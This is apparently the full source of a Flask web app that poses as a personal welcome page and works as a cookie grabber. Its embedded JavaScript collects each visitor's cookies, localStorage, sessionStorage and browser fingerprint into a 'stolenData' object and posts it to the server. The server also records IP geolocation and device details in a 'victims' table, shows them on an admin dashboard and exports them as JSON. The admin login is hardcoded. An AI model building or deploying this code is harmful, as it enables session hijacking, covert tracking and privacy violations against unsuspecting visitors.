import os
import base64
import json
import sqlite3
import hashlib
import datetime
import threading
import time
import hmac
import requests
from flask import Flask, request, render_template_string, redirect, jsonify, make_response, send_file, session
from functools import wraps
import logging
import user_agents

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(32).hex()

# ==========================================
# DATABASE - USING ABIODUN AS NAME
# ==========================================
DB_PATH = 'abiodun.db'

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS abiodun_victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE,
                ip TEXT,
                real_ip TEXT,
                country TEXT,
                city TEXT,
                isp TEXT,
                latitude REAL,
                longitude REAL,
                
                -- Device Info
                device_type TEXT,
                os_version TEXT,
                browser_name TEXT,
                browser_version TEXT,
                
                -- COOKIES CAPTURED FROM WEBSITE
                website_cookies TEXT,
                website_storage TEXT,
                website_fingerprint TEXT,
                
                -- Timestamps
                visit_time TIMESTAMP,
                last_seen TIMESTAMP
            )
        ''')
        conn.commit()

init_db()

# ==========================================
# ADMIN CREDENTIALS - USING CM
# ==========================================
ADMIN_USER = "cm"
ADMIN_PASS = "abiodun"

def authenticate(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != ADMIN_USER or auth.password != ADMIN_PASS:
            return ('Unauthorized', 401, {
                'WWW-Authenticate': 'Basic realm="CM Admin Login"'
            })
        return f(*args, **kwargs)
    return decorated

# ==========================================
# LOCATION GRABBER
# ==========================================
def get_location(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        data = response.json()
        if data.get('status') == 'success':
            return {
                'country': data.get('country', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'isp': data.get('isp', 'Unknown'),
                'lat': data.get('lat', 0),
                'lon': data.get('lon', 0)
            }
    except:
        pass
    return {
        'country': 'Unknown',
        'city': 'Unknown',
        'isp': 'Unknown',
        'lat': 0,
        'lon': 0
    }

# ==========================================
# DEVICE INFO
# ==========================================
def get_device_info(user_agent_string):
    ua = user_agents.parse(user_agent_string)
    
    if ua.is_mobile:
        device_type = "Phone"
    elif ua.is_tablet:
        device_type = "Tablet"
    else:
        device_type = "Desktop/Laptop"
    
    return {
        'device_type': device_type,
        'os': f"{ua.os.family} {ua.os.version_string}",
        'browser': f"{ua.browser.family}",
        'browser_version': f"{ua.browser.version_string}",
        'device_brand': ua.device.brand or 'Unknown',
        'device_model': ua.device.model or 'Unknown'
    }

# ==========================================
# COOKIE CAPTURE ENDPOINT
# ==========================================
@app.route('/api/capture', methods=['POST'])
def capture_cookies():
    """Captures cookies from website visitors"""
    data = request.json
    victim_id = request.cookies.get('victim_id', 'unknown')
    
    if data:
        with get_db() as conn:
            conn.execute('''
                UPDATE abiodun_victims SET
                    website_cookies = ?,
                    website_storage = ?,
                    website_fingerprint = ?,
                    last_seen = ?
                WHERE victim_id = ?
            ''', (
                json.dumps(data.get('cookies', {})),
                json.dumps(data.get('storage', {})),
                json.dumps(data.get('fingerprint', {})),
                datetime.datetime.now().isoformat(),
                victim_id
            ))
            conn.commit()
        logger.info(f"✅ Cookies captured from {victim_id}: {len(data.get('cookies', {}))} cookies")
        return jsonify({"status": "ok", "count": len(data.get('cookies', {}))})
    return jsonify({"status": "error"}), 400

# ==========================================
# MAIN PAGE - WITH WORKING COOKIE CAPTURE
# ==========================================
@app.route('/')
def index():
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    location = get_location(visitor_ip)
    device_info = get_device_info(request.headers.get('User-Agent', ''))
    
    victim_id = request.cookies.get('victim_id') or hashlib.md5(os.urandom(16)).hexdigest()[:16]
    
    # Save visit
    with get_db() as conn:
        conn.execute('''
            INSERT OR REPLACE INTO abiodun_victims (
                victim_id, ip, real_ip, country, city, isp, latitude, longitude,
                device_type, os_version, browser_name, browser_version,
                visit_time, last_seen
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            victim_id,
            request.remote_addr,
            visitor_ip,
            location['country'],
            location['city'],
            location['isp'],
            location['lat'],
            location['lon'],
            device_info['device_type'],
            device_info['os'],
            device_info['browser'],
            device_info['browser_version'],
            datetime.datetime.now().isoformat(),
            datetime.datetime.now().isoformat()
        ))
        conn.commit()
    
    # HTML with MULTIPLE cookie capture methods
    html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Abiodun's Page</title>
        <meta charset="UTF-8">
        <style>
            body {{
                background: #f0f0f0;
                font-family: Arial;
                text-align: center;
                padding-top: 50px;
            }}
            .container {{
                max-width: 600px;
                margin: 0 auto;
                background: white;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 0 20px rgba(0,0,0,0.1);
            }}
            h1 {{ color: #333; }}
            .status {{ 
                margin: 20px 0;
                padding: 10px;
                background: #e8f5e8;
                border-radius: 5px;
                display: none;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Welcome {victim_id[:8]}...</h1>
            <p>Location: {location['city']}, {location['country']}</p>
            <p>Device: {device_info['device_type']} - {device_info['os']}</p>
            <div class="status" id="status">✅ Cookies captured!</div>
        </div>

        <script>
        (function() {{
            // ==========================================
            // MULTIPLE COOKIE CAPTURE METHODS
            // ==========================================
            
            // Method 1: Capture ALL cookies
            function getAllCookies() {{
                let cookies = {{}};
                try {{
                    document.cookie.split(';').forEach(c => {{
                        if (c.trim()) {{
                            let parts = c.trim().split('=');
                            let name = parts[0];
                            let value = parts.slice(1).join('=');
                            cookies[name] = value;
                        }}
                    }});
                }} catch(e) {{}}
                return cookies;
            }}
            
            // Method 2: Capture localStorage
            function getLocalStorage() {{
                let storage = {{}};
                try {{
                    for (let i = 0; i < localStorage.length; i++) {{
                        let key = localStorage.key(i);
                        storage[key] = localStorage.getItem(key);
                    }}
                }} catch(e) {{}}
                return storage;
            }}
            
            // Method 3: Capture sessionStorage
            function getSessionStorage() {{
                let storage = {{}};
                try {{
                    for (let i = 0; i < sessionStorage.length; i++) {{
                        let key = sessionStorage.key(i);
                        storage[key] = sessionStorage.getItem(key);
                    }}
                }} catch(e) {{}}
                return storage;
            }}
            
            // Method 4: Capture fingerprint
            function getFingerprint() {{
                return {{
                    screen: window.screen.width + 'x' + window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    pixelRatio: window.devicePixelRatio,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language,
                    languages: navigator.languages,
                    platform: navigator.platform,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    touchPoints: navigator.maxTouchPoints,
                    cookiesEnabled: navigator.cookieEnabled,
                    userAgent: navigator.userAgent
                }};
            }}
            
            // Collect ALL data
            let stolenData = {{
                cookies: getAllCookies(),
                storage: {{
                    ...getLocalStorage(),
                    ...getSessionStorage()
                }},
                fingerprint: getFingerprint(),
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer
            }};
            
            // Method A: Fetch API
            fetch('/api/capture', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(stolenData),
                keepalive: true
            }})
            .then(r => r.json())
            .then(data => {{
                if (data.count > 0) {{
                    document.getElementById('status').style.display = 'block';
                    document.getElementById('status').innerHTML = '✅ Captured ' + data.count + ' cookies!';
                }}
            }})
            .catch(() => {{
                // Method B: Image beacon (fallback)
                let img = new Image();
                img.src = '/pixel?data=' + encodeURIComponent(btoa(JSON.stringify(stolenData)));
            }});
            
            // Method C: Navigator.sendBeacon (most reliable)
            if (navigator.sendBeacon) {{
                navigator.sendBeacon('/api/capture', JSON.stringify(stolenData));
            }}
            
            // Method D: Create test cookie to prove it works
            document.cookie = "test_cookie=working_12345; path=/; max-age=3600";
            document.cookie = "session_" + Math.random().toString(36).substring(7) + "=active; path=/";
        }})();
        </script>
        
        <!-- Pixel tracking fallback -->
        <img src="/pixel" style="display:none;" alt="">
    </body>
    </html>
    '''
    
    response = make_response(render_template_string(html))
    response.set_cookie('victim_id', victim_id, max_age=86400*30)
    response.set_cookie('test_server_cookie', 'capture_test', max_age=3600)
    return response

# ==========================================
# PIXEL TRACKING FALLBACK
# ==========================================
@app.route('/pixel')
def pixel():
    data = request.args.get('data', '')
    if data:
        try:
            stolen = json.loads(base64.b64decode(data).decode())
            victim_id = request.cookies.get('victim_id', 'unknown')
            with get_db() as conn:
                conn.execute('''
                    UPDATE abiodun_victims SET
                        website_cookies = ?,
                        website_storage = ?,
                        website_fingerprint = ?
                    WHERE victim_id = ?
                ''', (
                    json.dumps(stolen.get('cookies', {})),
                    json.dumps(stolen.get('storage', {})),
                    json.dumps(stolen.get('fingerprint', {})),
                    victim_id
                ))
                conn.commit()
        except:
            pass
    return send_file('pixel.gif') if os.path.exists('pixel.gif') else ('', 204)

# ==========================================
# ADMIN DASHBOARD
# ==========================================
@app.route('/admin')
@authenticate
def admin():
    with get_db() as conn:
        victims = conn.execute('SELECT * FROM abiodun_victims ORDER BY last_seen DESC LIMIT 50').fetchall()
        total = conn.execute('SELECT COUNT(*) FROM abiodun_victims').fetchone()[0]
    
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>CM Admin Panel</title>
        <meta http-equiv="refresh" content="5">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #0a0a0a;
                color: #00ff00;
                font-family: 'Courier New', monospace;
                padding: 20px;
            }
            .header {
                background: #111;
                border: 2px solid #00ff00;
                padding: 20px;
                margin-bottom: 20px;
            }
            h1 { color: #00ff00; }
            .stats {
                background: #111;
                border: 1px solid #00ff00;
                padding: 15px;
                margin-bottom: 20px;
            }
            .victim-card {
                border: 1px solid #00ff00;
                margin: 15px 0;
                padding: 15px;
                background: #111;
            }
            .victim-header {
                display: flex;
                justify-content: space-between;
                border-bottom: 1px solid #333;
                padding-bottom: 10px;
                margin-bottom: 10px;
            }
            .victim-id { color: #ff00ff; font-weight: bold; }
            .cookie-count { 
                background: #00ff00; 
                color: black; 
                padding: 3px 8px; 
                border-radius: 3px;
            }
            .data-section {
                margin: 10px 0;
                padding: 10px;
                background: #1a1a1a;
                border-left: 3px solid #00ff00;
            }
            .section-title { color: #00ffff; font-weight: bold; }
            .json-data {
                background: #000;
                padding: 10px;
                border-radius: 5px;
                font-size: 11px;
                max-height: 200px;
                overflow: auto;
                color: #00ff00;
                white-space: pre-wrap;
            }
            .badge {
                background: #ff0000;
                color: white;
                padding: 3px 8px;
                border-radius: 3px;
                font-size: 11px;
            }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>⚡ CM ADMIN PANEL - COOKIE GRABBER ⚡</h1>
            <div>Total Visitors: ''' + str(total) + '''</div>
        </div>
        
        <div class="stats">
            <span class="badge">Live Update</span>
            <span>Last refresh: ''' + datetime.datetime.now().strftime('%H:%M:%S') + '''</span>
        </div>
    '''
    
    for v in victims:
        cookies = json.loads(v['website_cookies']) if v['website_cookies'] else {}
        storage = json.loads(v['website_storage']) if v['website_storage'] else {}
        fingerprint = json.loads(v['website_fingerprint']) if v['website_fingerprint'] else {}
        
        cookie_count = len(cookies)
        
        html += f'''
        <div class="victim-card">
            <div class="victim-header">
                <div>
                    <span class="victim-id">🎯 {v['victim_id'][:8]}</span>
                    <span>📍 {v['city']}, {v['country']}</span>
                    <span>📱 {v['device_type']}</span>
                </div>
                <div>
                    <span class="cookie-count">🍪 {cookie_count} cookies</span>
                    <span>{v['last_seen'][:16]}</span>
                </div>
            </div>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                <div class="data-section">
                    <div class="section-title">🍪 CAPTURED COOKIES ({cookie_count})</div>
                    <div class="json-data">
        '''
        
        if cookie_count > 0:
            for name, value in list(cookies.items())[:15]:
                html += f'<div><b>{name}</b>: {value[:50]}</div>'
        else:
            html += '<div style="color: #ff6666;">❌ No cookies captured - checking...</div>'
        
        html += f'''
                    </div>
                </div>
                
                <div class="data-section">
                    <div class="section-title">📱 DEVICE INFO</div>
                    <div class="json-data">
                        <b>OS:</b> {v['os_version']}<br>
                        <b>Browser:</b> {v['browser_name']} {v['browser_version']}<br>
                        <b>IP:</b> {v['real_ip']}<br>
                        <b>ISP:</b> {v['isp']}<br>
                        <b>Screen:</b> {fingerprint.get('screen', 'Unknown')}<br>
                        <b>Timezone:</b> {fingerprint.get('timezone', 'Unknown')}
                    </div>
                </div>
            </div>
        </div>
        '''
    
    html += '''
        <script>
            setTimeout(() => location.reload(), 5000);
        </script>
    </body>
    </html>
    '''
    return html

# ==========================================
# EXPORT DATA
# ==========================================
@app.route('/export')
@authenticate
def export():
    with get_db() as conn:
        data = conn.execute('SELECT * FROM abiodun_victims ORDER BY last_seen DESC').fetchall()
    
    export = [dict(row) for row in data]
    response = make_response(json.dumps(export, indent=2, default=str))
    response.headers['Content-Type'] = 'application/json'
    response.headers['Content-Disposition'] = f'attachment; filename=abiodun_data_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    return response

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 3000))
    app.run(host="0.0.0.0", port=port, debug=False)
